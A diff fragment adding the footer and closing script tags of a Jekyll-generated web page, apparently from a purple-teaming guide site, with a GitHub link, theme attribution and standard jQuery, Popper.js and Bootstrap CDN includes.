+       <div class="col-xl-10 offset-xl-1"><div role="navigation" class="d-flex flex-wrap justify-content-center"><a href="https://github.com/orgs/aguidetopurpleteaming" title="footerRepo on Github" class="chulapa-footer-sociallink lead"><span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+              </span><span class="sr-only">Repo on Github</span>
+            </a></div><p class="mt-2 mb-3">&copy; 2025 ajpc500</p>
+          <!-- Do not remove this in order to give  attributions -->
+         <p class="chulapa-footer-brand">Powered by <a href="https://dieghernan.github.io/chulapa"> <span class="chulapa">Chulapa</span> Jekyll Theme</a><br><b>Lux</b> skin by <a href="https://bootswatch.com/">Bootswatch</a></p>
+          <!-- End  attributions -->
+       </div>
+     </div>
+ </div>
+</footer>
+<!-- Footer -->
+<!-- JS, Popper.js, and jQuery -->
+	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js"></script>
+	<!-- start custom scripts to be placed at the bottom of the page -->
+<!-- end custom bottom scripts -->
+	</body>
+</html>
